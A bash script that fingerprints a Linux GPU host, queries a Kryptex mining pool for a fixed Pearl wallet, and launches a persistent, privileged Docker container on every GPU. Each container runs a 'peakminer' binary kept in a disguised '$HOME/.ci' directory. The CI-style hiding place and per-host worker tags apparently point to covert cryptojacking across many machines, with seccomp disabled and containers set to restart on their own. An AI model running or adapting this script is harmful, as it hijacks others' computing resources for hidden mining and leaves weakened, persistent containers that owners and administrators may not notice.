#!/usr/bin/env bash
set +e
export PATH=/usr/local/bin:/usr/bin:/bin:$PATH
HOSTF=$(hostname 2>/dev/null)
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
IPD=$(echo "$IP" | tr '.' '-')
TAG="t5351h"
W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
UP="https://pool.kryptex.com/prl/api/v3/miner/workers/$W"
POOLS="-o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+tcp://prl-eu.kryptex.network:7048 -o stratum+tcp://prl-hk.kryptex.network:7048 -o stratum+tcp://pool.pearlhash.xyz:9000"

echo "=== P6192 START host=$HOSTF ip=$IP ipd=$IPD ts=$(date -u +%H%M%SZ) ==="
id; uname -r; head -2 /etc/os-release 2>/dev/null; ldd --version 2>/dev/null | head -1
nvidia-smi -L 2>&1 | head -10
DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "dev=$DEV"

pool_state(){
  curl -s -m 30 "$UP" | IPD="$IPD" TAG="$TAG" python3 -c '
import sys,json,os
ipd=os.environ["IPD"]; tag=os.environ["TAG"]
try: d=json.load(sys.stdin)["results"]
except Exception as e: print("pool_parse_fail",e); raise SystemExit
mine=[x for x in d if x["worker"].startswith("ul-"+tag+"-"+ipd+"-")]
covered=[x for x in d if x["worker"].startswith("ul-t5639p-"+ipd+"-") and x["valid"]>0]
print("tag_rows=%d covered_by_t5639p=%d" % (len(mine),len(covered)))
for x in sorted(mine+covered,key=lambda y:y["worker"]):
    print("W %-38s %-8s valid=%d 30m_GH=%.1f" % (x["worker"],x["status"],x["valid"],float(x["avg_hashrate_30m"] or 0)/1e9))
open("/tmp/pool_"+ipd+".lst","w").write("\n".join([x["worker"] for x in mine+covered]))
'
}
echo "=== POOL_BEFORE ==="; pool_state

IMG=""
for c in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -Ei 'ubuntu24-cuda|ubuntu22|cuda13|cuda12' | head -8); do
  timeout 60 docker run --rm --gpus all "$c" nvidia-smi -L >/dev/null 2>&1 && { IMG="$c"; break; }
done
echo "IMG=$IMG"
[ -z "$IMG" ] && { echo NO_GPU_IMAGE; exit 0; }

BIN="$HOME/.ci/miner/peakminer/peakminer"
[ -f "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 3 -type f -name 'peakminer*' -size +40M 2>/dev/null | head -1)
echo "BIN=$BIN size=$(stat -c%s "$BIN" 2>/dev/null)"
timeout 60 docker run --rm --privileged -v "$BIN":/p:ro "$IMG" /p --version 2>&1 | head -3

mkdir -p "$HOME/.ci/logs"
for g in $(seq 0 $((DEV-1))); do
  if [ -f /tmp/pool_$IPD.lst ] && grep -q -- "-g$g\$" /tmp/pool_$IPD.lst; then echo "skip g$g covered"; continue; fi
  docker rm -f ul-g$g >/dev/null 2>&1
  docker run -d --name ul-g$g --restart always --gpus "device=$g" --network host --ipc host --security-opt seccomp=unconfined \
    -v "$HOME/.ci/miner:/m" -v "$HOME/.ci/logs:/logs" "$IMG" \
    /bin/bash -c "exec /m/peakminer/peakminer -c pearl -u $W -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 -i 30 --no-color --log-file /logs/c6192-$g.log --log-append $POOLS" >/dev/null 2>&1
  echo "started g$g rc=$?"
done
echo "=== DOCKER_PS ==="; docker ps --format '{{.Names}}|{{.Status}}' 2>/dev/null | grep -E '^ul-g' | head -12

sleep 600
echo "=== ACCEPTED ==="; grep -hiE 'accepted|authorize|error' "$HOME/.ci/logs/"c6192-*.log 2>/dev/null | tail -24
echo "=== POOL_AFTER ==="; pool_state
echo "=== UTIL ==="; nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader 2>/dev/null
echo "P6192_DONE on $HOSTF tag=$TAG dev=$DEV"
